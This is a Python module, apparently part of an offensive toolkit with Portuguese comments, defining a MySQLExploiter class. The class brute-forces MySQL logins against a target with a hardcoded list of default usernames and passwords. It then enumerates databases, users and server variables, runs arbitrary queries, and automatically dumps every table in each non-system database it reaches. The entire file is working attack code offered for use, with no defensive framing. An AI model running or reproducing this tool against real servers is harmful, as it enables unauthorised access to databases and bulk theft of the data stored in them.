# modules/database/mysql.py
import mysql.connector
import socket
from concurrent.futures import ThreadPoolExecutor

class MySQLExploiter:
    def __init__(self):
        self.common_users = ['root', 'admin', 'mysql', 'test', 'user']
        self.common_passwords = [
            '', 'root', '123456', 'password', 'admin', 'mysql',
            'test', '12345', 'toor'
        ]

    def connect_mysql(self, target, port=3306, username=None, password=None, timeout=5):
        """Tenta conexão MySQL"""
        try:
            conn = mysql.connector.connect(
                host=target,
                port=port,
                user=username,
                password=password,
                connection_timeout=timeout
            )
            return conn
        except:
            return None

    def brute_force_mysql(self, target, port=3306):
        """Força bruta MySQL"""
        valid_creds = []
        
        for user in self.common_users:
            for password in self.common_passwords:
                conn = self.connect_mysql(target, port, user, password)
                if conn:
                    valid_creds.append((user, password))
                    print(f"[+] MySQL Credencial: {user}:{password}")
                    
                    # Obtém informações básicas
                    try:
                        cursor = conn.cursor()
                        cursor.execute("SELECT VERSION()")
                        version = cursor.fetchone()[0]
                        print(f"    [+] Versão: {version}")
                    except:
                        pass
                    
                    conn.close()
        
        return valid_creds

    def get_mysql_info(self, target, port, username, password):
        """Obtém informações do MySQL"""
        info = {}
        conn = self.connect_mysql(target, port, username, password)
        
        if conn:
            try:
                cursor = conn.cursor()
                
                # Informações da instância
                cursor.execute("SELECT VERSION()")
                info['version'] = cursor.fetchone()[0]
                
                cursor.execute("SELECT DATABASE()")
                info['current_database'] = cursor.fetchone()[0]
                
                # Bancos de dados
                cursor.execute("SHOW DATABASES")
                info['databases'] = [row[0] for row in cursor.fetchall()]
                
                # Usuários
                cursor.execute("SELECT user FROM mysql.user")
                info['users'] = [row[0] for row in cursor.fetchall()]
                
                # Variáveis de configuração
                cursor.execute("SHOW VARIABLES")
                info['variables'] = dict(cursor.fetchall())
                
            except Exception as e:
                info['error'] = str(e)
            finally:
                conn.close()
        
        return info

    def execute_command(self, target, port, username, password, query):
        """Executa query MySQL"""
        conn = self.connect_mysql(target, port, username, password)
        if not conn:
            return None
        
        try:
            cursor = conn.cursor()
            cursor.execute(query)
            
            if cursor.description:  # Se retorna resultados
                result = cursor.fetchall()
            else:
                result = "Query executada com sucesso"
            
            conn.close()
            return result
            
        except Exception as e:
            return f"Erro: {str(e)}"

    def dump_database(self, target, port, username, password, database):
        """Faz dump de database específico"""
        conn = self.connect_mysql(target, port, username, password)
        if not conn:
            return None
        
        try:
            cursor = conn.cursor()
            cursor.execute(f"USE {database}")
            
            # Lista tabelas
            cursor.execute("SHOW TABLES")
            tables = [row[0] for row in cursor.fetchall()]
            
            dump_data = {}
            for table in tables:
                try:
                    cursor.execute(f"SELECT * FROM {table}")
                    rows = cursor.fetchall()
                    dump_data[table] = rows
                except:
                    continue
            
            conn.close()
            return dump_data
            
        except Exception as e:
            return f"Erro: {str(e)}"

    def check_vulnerabilities(self, target, port):
        """Verifica vulnerabilidades comuns do MySQL"""
        vulns = []
        
        # Verifica se permite conexão sem senha
        try:
            conn = self.connect_mysql(target, port, 'root', '')
            if conn:
                vulns.append("Login sem senha permitido")
                conn.close()
        except:
            pass
        
        return vulns

    def scan_mysql(self, target, port=3306):
        """Scan completo MySQL"""
        print(f"[+] Scan MySQL em: {target}:{port}")
        
        results = {
            'credentials': [],
            'info': {},
            'vulnerabilities': [],
            'databases': []
        }
        
        # Força bruta
        results['credentials'] = self.brute_force_mysql(target, port)
        
        # Se tiver credenciais, obtém mais informações
        if results['credentials']:
            user, password = results['credentials'][0]
            results['info'] = self.get_mysql_info(target, port, user, password)
            
            # Verifica vulnerabilidades
            results['vulnerabilities'] = self.check_vulnerabilities(target, port)
            
            # Tenta dump de databases
            if 'databases' in results['info']:
                for db in results['info']['databases']:
                    if db not in ['mysql', 'information_schema', 'performance_schema', 'sys']:
                        print(f"    [+] Dump database: {db}")
                        dump = self.dump_database(target, port, user, password, db)
                        if dump and isinstance(dump, dict):
                            results['databases'].append({db: dump})
        
        return results